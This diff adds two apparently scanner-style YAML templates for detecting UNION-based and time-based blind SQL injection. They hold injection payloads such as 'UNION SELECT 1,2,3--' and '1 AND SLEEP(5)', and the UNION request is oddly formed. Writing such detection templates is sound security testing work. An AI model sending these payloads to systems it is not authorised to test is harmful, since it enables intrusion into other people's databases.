@@ -1,0 +1,75 @@
+id: sqli-param-union-based
+name: "SQL Injection - Union Based Detection"
+severity: "critical"
+tags: [sqli, injection, union]
+description: |
+  检测基于 UNION 的 SQL 注入漏洞。
+  使用 range 循环测试多个注入点，变量延迟解析引用提取的 token。
+
+variables:
+  # 变量延迟解析示例：引用 extractor 结果
+  base_url: "{{Hostname}}"
+  test_param: "id"
+
+http:
+  - raw: |
+      GET /api/users/{{test_param}}=1 UNION SELECT 1,2,3-- HTTP/1.1
+      Host: {{Hostname}}
+    range:
+      key: "test_param"
+      values:
+        - "id"
+        - "user_id"
+        - "uid"
+        - "name"
+        - "username"
+        - "page"
+        - "sort"
+        - "order"
+    extractors:
+      - name: "error_msg"
+        type: "xpath"
+        xpath: ['//body//*/text()[contains(., "SQL") or contains(., "sql") or contains(., "syntax") or contains(., "error")]']
+      - name: "unique_cols"
+        type: "regex"
+        regex: ['Column count doesn''t match value count at row (\d+)']
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(error_msg, 'SQL')"
+          - "contains(error_msg, 'syntax')"
+          - "regex(error_msg, 'SQL syntax|mysql_fetch|mysql_num_rows')"
+
+---
+id: sqli-time-based-blind
+name: "SQL Injection - Time Based Blind"
+severity: "high"
+tags: [sqli, injection, blind, time]
+description: |
+  检测基于时间的盲注漏洞。
+  使用 DSL 表达式和变量延迟解析。
+
+variables:
+  # 定义注入载荷变量
+  payload: "1 AND SLEEP(5)"
+  timeout_threshold: "4"
+
+http:
+  - raw: |
+      GET /api/users?id=1 HTTP/1.1
+      Host: {{Hostname}}
+    matchers:
+      - type: time
+        time: ">=1"
+
+  - raw: |
+      GET /api/users?id=1%20AND%20SLEEP(5) HTTP/1.1
+      Host: {{Hostname}}
+    matchers:
+      - type: time
+        time: ">=4"
+    extractors:
+      - name: "response_time"
+        type: "regex"
+        part: "header"
+        regex: ['(?i)X-Response-Time:\s*(\d+)']
